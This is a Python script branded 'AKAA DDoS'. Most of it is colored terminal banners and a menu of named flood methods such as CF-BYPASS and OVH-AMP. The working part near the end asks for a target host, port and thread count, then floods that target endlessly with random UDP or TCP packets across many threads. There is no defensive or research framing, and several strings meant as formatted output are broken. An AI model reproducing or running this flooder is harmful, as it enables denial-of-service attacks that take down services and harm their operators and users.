import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name
import socket
import os
import requests
import random
from pystyle import Colors, Colorate, Center
from asciimatics.effects import BannerText, Print, Scroll
from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError, StopApplication
import getpass
import time
from time import sleep
import sys

uname=input("Enter Sever Username : ")
os.system("cls" if os.name == "nt" else "clear")
print("Welcome To Sever | User: {uname}")
print("please wait.")
time.sleep(1)
os.system("cls" if os.name == "nt" else "clear")
print("Welcome To Sever | User: {uname}")
print("please wait..")
time.sleep(1)
os.system("cls" if os.name == "nt" else "clear")
print("Welcome To Sever | User: {uname}")
print("please wait...")
ip= requests.get('https://api.ipify.org').text.strip()
online= random.randint(1, 153)


###Help Gif###

def hlp(screen):

    scenes = []

    effects = [

        Print(screen,

              ColourImageFile(screen, "help.gif", screen.height,

                              uni=screen.unicode_aware),

              screen.height//- 5,

              speed=1),

    ]

    scenes.append(Scene(effects, 24))



    screen.play(scenes, stop_on_resize=False, repeat=False)

###Attack gif###

def atk(screen):

    scenes = []

    effects = [

        Print(screen,

              ColourImageFile(screen, "atk.gif", screen.height,

                              uni=screen.unicode_aware),

              screen.height//- 5,

              speed=1),

    ]

    scenes.append(Scene(effects, 21))



    screen.play(scenes, stop_on_resize=False, repeat=False)

###Method gif###

def mthd(screen):

    scenes = []

    effects = [

        Print(screen,

              ColourImageFile(screen, "methods.gif", screen.height,

                              uni=screen.unicode_aware),

              screen.height//- 5,

              speed=0.5),

    ]

    scenes.append(Scene(effects, 20))



    screen.play(scenes, stop_on_resize=False, repeat=False)



###COPYRIGHT tool###

def si():

    print('       \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mAkaa \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to AKAA DDoS! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: @mduc08 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mVersion: 1')



###My ip####

def mip():

    print("""[0mYour IP Is [40;38;2;127;0;255m{ip}[0m""")

###Account###

def account():

    print("""[0mID: [38;2;255;0;255mUnknown[0m

[0mUsername: [38;2;255;0;255m{uname}

[0mAdmin: false

[0mReseller: false

[0mVIP: false

[0mBypass Blacklist: true



[0mExpiry: [38;2;255;0;255m30[0m Day(s)

[0mMaxTime: [38;2;255;0;255m99999 [0mSeconds

[0mCooldown: [38;2;255;0;255m0[0m Seconds

[0mConcurrents: [38;2;255;0;255m1[0m

[0mMax Sessions: [38;2;255;0;255m4[0m

[0mMy Attacks Sent: [38;2;255;0;255mUnknow[0m

[0mCurrent IPv4: [38;2;255;0;255m{ip}[0m""")



###help###

def help():

    Screen.wrapper(hlp)

    os.system("cls" if os.name == "nt" else "clear")

    print("""

                       [38;2;255;0;255m╦ [38;2;237;18;255m ╦═[38;2;219;36;255m╗[38;2;201;54;255m ╦  [38;2;183;72;255m╔╦[38;2;165;90;255m╗[38;2;147;108;255m╔[38;2;129;126;255m╦╗[38;2;111;144;255m╔═[38;2;93;162;255m╗[38;2;75;180;255m╔[38;2;57;198;255m═[38;2;39;216;255m╗

                       [38;2;255;0;255m╚╗[38;2;237;18;255m╔[38;2;219;36;255m╝[38;2;201;54;255m╔╩[38;2;183;72;255m╦[38;2;165;90;255m╝   [38;2;147;108;255m║[38;2;129;126;255m║ [38;2;111;144;255m║[38;2;93;162;255m║[38;2;75;180;255m║ [38;2;57;198;255m║[38;2;39;216;255m╚═╗

                        [38;2;255;0;255m╚[38;2;237;18;255m╝[38;2;219;36;255m ╩ ╚[38;2;201;54;255m═  [38;2;183;72;255m═[38;2;165;90;255m╩╝[38;2;147;108;255m═[38;2;129;126;255m╩╝[38;2;111;144;255m╚═[38;2;93;162;255m╝[38;2;75;180;255m╚[38;2;57;198;255m═[38;2;39;216;255m╝

                      [38;2;255;0;255m𝑨𝑲𝑨𝑨 [1;36m𝑫𝑫𝒐𝑺, [1;31m𝑶𝒃𝒔𝒆𝒔𝒔𝒆𝒅 𝑾𝒊𝒕𝒉 𝒀𝒐𝒖.

           [38;2;255;0;255m [38;2;250;5;255m [38;2;245;10;255m╔[38;2;240;15;255m═[38;2;235;20;255m═[38;2;230;25;255m═[38;2;225;30;255m═[38;2;220;35;255m═[38;2;215;40;255m═[38;2;210;45;255m═[38;2;205;50;255m═[38;2;200;55;255m═[38;2;195;60;255m═[38;2;190;65;255m═[38;2;185;70;255m═[38;2;180;75;255m═[38;2;175;80;255m═[38;2;170;85;255m╦[38;2;165;90;255m═[38;2;160;95;255m═[38;2;155;100;255m═[38;2;150;105;255m═[38;2;145;110;255m═[38;2;140;115;255m═[38;2;135;120;255m═[38;2;130;125;255m═[38;2;125;130;255m═[38;2;120;135;255m═[38;2;115;140;255m═[38;2;110;145;255m═[38;2;105;150;255m═[38;2;100;155;255m═[38;2;95;160;255m═[38;2;90;165;255m═[38;2;85;170;255m═[38;2;80;175;255m═[38;2;75;180;255m═[38;2;70;185;255m═[38;2;65;190;255m═[38;2;60;195;255m═[38;2;55;200;255m═[38;2;50;205;255m═[38;2;45;210;255m═[38;2;40;215;255m═[38;2;35;220;255m═[38;2;30;225;255m═[38;2;25;230;255m╗[38;2;20;235;255m

           [38;2;255;0;255m╔[38;2;250;5;255m═[38;2;245;10;255m╣   [1;37mCOMMANDS   [38;2;170;85;255m║         [1;37mDESCRIPTION        [38;2;25;230;255m╠[38;2;20;235;255m═[38;2;15;240;255m╗[38;2;10;245;255m

           [38;2;255;0;255m║[1;37mH[38;2;245;10;255m╠[38;2;240;15;255m═[38;2;235;20;255m═[38;2;230;25;255m═[38;2;225;30;255m═[38;2;220;35;255m═[38;2;215;40;255m═[38;2;210;45;255m═[38;2;205;50;255m═[38;2;200;55;255m═[38;2;195;60;255m═[38;2;190;65;255m═[38;2;185;70;255m═[38;2;180;75;255m═[38;2;175;80;255m═[38;2;170;85;255m╬[38;2;165;90;255m═[38;2;160;95;255m═[38;2;155;100;255m═[38;2;150;105;255m═[38;2;145;110;255m═[38;2;140;115;255m═[38;2;135;120;255m═[38;2;130;125;255m═[38;2;125;130;255m═[38;2;120;135;255m═[38;2;115;140;255m═[38;2;110;145;255m═[38;2;105;150;255m═[38;2;100;155;255m═[38;2;95;160;255m═[38;2;90;165;255m═[38;2;85;170;255m═[38;2;80;175;255m═[38;2;75;180;255m═[38;2;70;185;255m═[38;2;65;190;255m═[38;2;60;195;255m═[38;2;55;200;255m═[38;2;50;205;255m═[38;2;45;210;255m═[38;2;40;215;255m═[38;2;35;220;255m═[38;2;30;225;255m═[38;2;25;230;255m╣[1;37mM[38;2;15;240;255m║

           [38;2;255;0;255m║[1;37mE[38;2;245;10;255m║ [1;37mMETHODS      [38;2;170;85;255m║ [1;32mAvailable Method Pages     [38;2;25;230;255m║[1;37mE[38;2;15;240;255m║

           [38;2;255;0;255m║[1;37mL[38;2;245;10;255m║ [1;37mACCOUNT      [38;2;170;85;255m║ [1;32mAccount Infomation         [38;2;25;230;255m║[1;37mN[38;2;15;240;255m║

           [38;2;255;0;255m║[1;37mP[38;2;245;10;255m║ [1;37mMYIP         [38;2;170;85;255m║ [1;32mShow Your IP               [38;2;25;230;255m║[1;37mU[38;2;15;240;255m║

           [38;2;255;0;255m╚[38;2;192;63;255m═[38;2;245;10;255m╣ [1;37mCLEAR        [38;2;170;85;255m║ [1;32mBack To Main Page          [38;2;25;230;255m╠[38;2;20;235;255m═[38;2;15;240;255m╝

           [38;2;255;0;255m [38;2;192;63;255m [38;2;245;10;255m║ [1;37mADMIN        [38;2;170;85;255m║ [1;32mAdmin Infomation           [38;2;25;230;255m║

           [38;2;255;0;255m [38;2;192;63;255m [38;2;245;10;255m║ [1;37mDISCORD      [38;2;170;85;255m║ [1;32mDiscord Sever Link         [38;2;25;230;255m║

           [38;2;255;0;255m [38;2;250;5;255m [38;2;245;10;255m╚[38;2;240;15;255m═[38;2;235;20;255m═[38;2;230;25;255m═[38;2;225;30;255m═[38;2;220;35;255m═[38;2;215;40;255m═[38;2;210;45;255m═[38;2;205;50;255m═[38;2;200;55;255m═[38;2;195;60;255m═[38;2;190;65;255m═[38;2;185;70;255m═[38;2;180;75;255m═[38;2;175;80;255m═[38;2;170;85;255m╩[38;2;165;90;255m═[38;2;160;95;255m═[38;2;155;100;255m═[38;2;150;105;255m═[38;2;145;110;255m═[38;2;140;115;255m═[38;2;135;120;255m═[38;2;130;125;255m═[38;2;125;130;255m═[38;2;120;135;255m═[38;2;115;140;255m═[38;2;110;145;255m═[38;2;105;150;255m═[38;2;100;155;255m═[38;2;95;160;255m═[38;2;90;165;255m═[38;2;85;170;255m═[38;2;80;175;255m═[38;2;75;180;255m═[38;2;70;185;255m═[38;2;65;190;255m═[38;2;60;195;255m═[38;2;55;200;255m═[38;2;50;205;255m═[38;2;45;210;255m═[38;2;40;215;255m═[38;2;35;220;255m═[38;2;30;225;255m═[38;2;25;230;255m╝[0;00m

""")

####Methods####

def meth():

    Screen.wrapper(mthd)

    os.system('cls' if os.name == 'nt' else 'clear')

    si()

    print("""

                          

                        [1;36m ╔╦╗ ┌─┐┌┬┐┬ ┬┌─┐┌┬┐┌─┐

                         [1;36m║║║ ├┤  │ ├─┤│ │ ││└─┐

                         [1;36m╩ ╩ └─┘ ┴ ┴ ┴└─┘─┴┘└─┘

                       [38;2;255;0;255m𝑨𝑲𝑨𝑨 [1;36m𝑫𝑫𝒐𝑺, [1;31m𝑶𝒃𝒔𝒆𝒔𝒔𝒆𝒅 𝑾𝒊𝒕𝒉 𝒀𝒐𝒖.

                  [38;2;243;12;255m╚╦[38;2;237;18;255m══[38;2;231;24;255m══[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m╦[38;2;75;180;255m╝

              [38;2;255;0;255m╔[38;2;249;6;255m═══[38;2;243;12;255m═╩[38;2;237;18;255m══[38;2;231;24;255m══[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m╩[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m╗

              [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mUDP\033[0m         [38;2;213;42;255m╔╗  \033[1;4m\x1b[38;2;255;215;0mSTD\033[0m        [38;2;135;120;255m╔[38;2;129;126;255m╗  \033[1;4m\x1b[38;2;255;215;0mHOME\033[0m      [38;2;51;204;255m║

              [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mTCP\033[0m         [38;2;213;42;255m║║  \033[1;4m\x1b[38;2;255;215;0mSTD-V2\033[0m     [38;2;135;120;255m║[38;2;129;126;255m║  \033[1;4m\x1b[38;2;255;215;0mSAMP\033[0m      [38;2;51;204;255m║

              [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mUDP-BYPASS\033[0m  [38;2;213;42;255m╚╝  \033[1;4m\x1b[38;2;255;215;0mMINECRAFT\033[0m  [38;2;135;120;255m╚[38;2;129;126;255m╝  \033[1;4m\x1b[38;2;255;215;0mOVH-AMP\033[0m   [38;2;51;204;255m║

       [38;2;255;0;255m╔══════[38;2;255;0;255m╩[38;2;249;6;255m═══[38;2;243;12;255m══[38;2;237;18;255m══[38;2;231;24;255m══[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m╩══════╗

     [38;2;255;0;255m╔═╩══════[38;2;255;0;255m═[38;2;249;6;255m═══[38;2;243;12;255m══[38;2;237;18;255m══[38;2;231;24;255m══[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m═══════╩═╗

     [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mNFO\033[0m     [38;2;249;6;255m╔╗ \033[1;4m\x1b[38;2;255;215;0mHTTP-RAW\033[0m    [38;2;207;48;255m╔╗ \033[1;4m\x1b[38;2;255;215;0mSLOW\033[0m  [38;2;159;96;255m╔[38;2;153;102;255m╗ \033[1;4m\x1b[38;2;255;215;0mUAM\033[0m        [38;2;75;180;255m╔[38;2;69;186;255m╗ \033[1;4m\x1b[38;2;255;215;0mTLS\033[0m       [38;2;51;204;255m║

     [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mDSTAT\033[0m   [38;2;249;6;255m║║ \033[1;4m\x1b[38;2;255;215;0mHTTP-RAND\033[0m   [38;2;207;48;255m║║ \033[1;4m\x1b[38;2;255;215;0mHYPER\033[0m [38;2;159;96;255m║[38;2;153;102;255m║ \033[1;4m\x1b[38;2;255;215;0mHTTPBYPASS\033[0m [38;2;75;180;255m║[38;2;69;186;255m║ \033[1;4m\x1b[38;2;255;215;0mCLOUDFLARE\033[0m[38;2;51;204;255m║

     [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mFIVEM\033[0m   [38;2;249;6;255m║║ \033[1;4m\x1b[38;2;255;215;0mHTTP-SOCKET\033[0m [38;2;207;48;255m║║ \033[1;4m\x1b[38;2;255;215;0mCRASH\033[0m [38;2;159;96;255m║[38;2;153;102;255m║ \033[1;4m\x1b[38;2;255;215;0mAKAA-DDOS\033[0m    [38;2;75;180;255m║[38;2;69;186;255m║ \033[1;4m\x1b[38;2;255;215;0mCF-BYPASS\033[0m [38;2;51;204;255m║

     [38;2;255;0;255m╚════════[38;2;255;0;255m═[38;2;249;6;255m╝╚═[38;2;243;12;255m══[38;2;237;18;255m══[38;2;231;24;255m══[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m╝╚[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m╝[38;2;153;102;255m╚[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126""")

ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"UDP Sent!!!")
		except:
			s.close()
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP = SOCK_STREAM
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"TCP Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

def new():
	for y in range(threads):
		if choice == 'y':
			th = threading.Thread(target = run)
			th.start()
		else:
			th = threading.Thread(target = run2)
			th.start()

def whereuwere():
    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
    print("Put 1 for UDP and 2 for TCP")
    whereman = str(input(" 1 or 2 >:("))
    if whereman == '1':
        run()
    else:
        run2()

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet Youre Leaving Sir -f slant")
	sys.exit(130)

def exit_gracefully(signum, frame):
    # restore the original signal handler
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" You wanna exit bby <3 ?:"))
        if exitc == 'y':

            byebye()

    except KeyboardInterrupt:
        print("Ok ok")
        byebye()

    # restore the gracefully exit handler
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    # store SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
